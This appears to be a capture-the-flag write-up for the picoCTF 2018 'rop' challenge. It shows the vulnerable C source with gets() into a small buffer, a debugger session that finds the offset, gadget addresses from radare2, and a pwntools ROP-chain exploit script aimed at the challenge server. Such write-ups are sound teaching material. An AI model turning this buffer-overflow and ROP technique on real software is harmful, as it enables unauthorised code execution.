Source code

```c
#include <stdio.h>                                                                          
#include <stdlib.h>
#include <string.h>
#include <unistd.h>                               
#include <sys/types.h>                                                                              #include <stdbool.h>
                         
#define BUFSIZE 16                                
                                                  
bool win1 = false;
bool win2 = false;
                                                                                                    
                         
void win_function1() {
  win1 = true;
}            
                         
void win_function2(unsigned int arg_check1) {
  if (win1 && arg_check1 == 0xBAAAAAAD) {
    win2 = true;
  }
  else if (win1) {                                
    printf("Wrong Argument. Try Again.\n");
  }                                               
  else {
    printf("Nope. Try a little bit harder.\n");
  }                                                                                                 
}                       
                                                  
void flag(unsigned int arg_check2) {
  char flag[48];
  FILE *file;                                                                                       
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
   
  if (win1 && win2 && arg_check2 == 0xDEADBAAD) {
    printf("%s", flag);
    return;
}
  else if (win1 && win2) {
    printf("Incorrect Argument. Remember, you can call other functions in between each win function!
\n");
  }
  else if (win1 || win2) {
    printf("Nice Try! You're Getting There!\n");
  }
  else {
    printf("You won't get the flag that easy..\n");
  }
}

void vuln() {
  char buf[16];
  printf("Enter your input> ");
  return gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
   
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
}
```

<br/>

Finding the offset

```bash
gef➤  disass main
Dump of assembler code for function main:                                             
   0x0804873b <+0>:     lea    ecx,[esp+0x4]                                          
   0x0804873f <+4>:     and    esp,0xfffffff0                                         
   0x08048742 <+7>:     push   DWORD PTR [ecx-0x4]                                    
   0x08048745 <+10>:    push   ebp                                                    
   0x08048746 <+11>:    mov    ebp,esp                                                
   0x08048748 <+13>:    push   ecx                                                    
   0x08048749 <+14>:    sub    esp,0x14                                               
   0x0804874c <+17>:    mov    eax,ds:0x804a03c                                       
   0x08048751 <+22>:    push   0x0                                                    
   0x08048753 <+24>:    push   0x2                                                    
   0x08048755 <+26>:    push   0x0                                                    
   0x08048757 <+28>:    push   eax                                                    
   0x08048758 <+29>:    call   0x8048490 <setvbuf@plt>                                
   0x0804875d <+34>:    add    esp,0x10                                               
   0x08048760 <+37>:    call   0x8048450 <getegid@plt>                                
   0x08048765 <+42>:    mov    DWORD PTR [ebp-0xc],eax                                
   0x08048768 <+45>:    sub    esp,0x4                                                
   0x0804876b <+48>:    push   DWORD PTR [ebp-0xc]                                    
   0x0804876e <+51>:    push   DWORD PTR [ebp-0xc]                                    
   0x08048771 <+54>:    push   DWORD PTR [ebp-0xc]                                    
   0x08048774 <+57>:    call   0x80484b0 <setresgid@plt>                              
   0x08048779 <+62>:    add    esp,0x10                                               
   0x0804877c <+65>:    call   0x8048714 <vuln>                                       
   0x08048781 <+70>:    mov    eax,0x0                                                
   0x08048786 <+75>:    mov    ecx,DWORD PTR [ebp-0x4]                                
   0x08048789 <+78>:    leave                                                         
   0x0804878a <+79>:    lea    esp,[ecx-0x4]                                          
   0x0804878d <+82>:    ret                                                           
End of assembler dump.                                                                
gef➤  pattern create 100                                                              
[+] Generating a pattern of 100 bytes                                                 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaava
aawaaaxaaayaaa
gef➤  break *0x0804878d                                                               
Breakpoint 1 at 0x804878d                                                             
gef➤  r                                                                               
Starting program: /home/c3t/ctf/picoctf/picoctf-2018/pwn/rop                          
Enter your input> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaa
raaasaaataaauaaavaaawaaaxaaayaaa                                                      
                                                                                      
Program received signal SIGSEGV, Segmentation fault.
[#0] Id 1, Name: "rop", stopped 0x61616168 in ?? (), reason: SIGSEGV
gef➤  pattern search 0x61616168
[+] Searching '0x61616168'
[+] Found at offset 28 (little-endian search) likely
```

Now, for exploit this will be:

<br/>

offset + win1 address + win2 address + gadget + arg 1 + flag address + gadget + arg 2

<br/>

Let's find the addresses with radare2

```bash
[0x080484d0]> s @ sym.win_function1 
0x80485cb
[0x080484d0]> s @ sym.win_function2
0x80485d8
[0x080484d0]> s @ sym.flag
0x804862b
```

<br/>

Now we have to find the pop and ret gadgets I'll use radare2, but there are automatized tools

```bash
[0x080484d0]> /R pop; ret;
0x0804840b               c408  les ecx, [eax]         
0x0804840d                 5b  pop ebx                                              
0x0804840e                 c3  ret
```

<br/>

Now let's make the script

```python
from pwn import *

user = ''
password = ''
host = '2018shell4.picoctf.com'

s = ssh(user=user,password=password,host=host)

p = s.run('cd /problems/rop-chain_3_f91334c5acb91bde3de858eb8045928a && ./rop')

payload = b'a'*28
payload += p32(0x80485cb)
payload += p32(0x80485d8)
payload += p32(0x0804840d)
payload += p32(0xBAAAAAAD)
payload += p32(0x804862b)
payload += p32(0x0804840d)
payload += p32(0xDEADBAAD)

p.recvuntil('Enter your input>')
p.sendline(payload)
p.interactive()
```
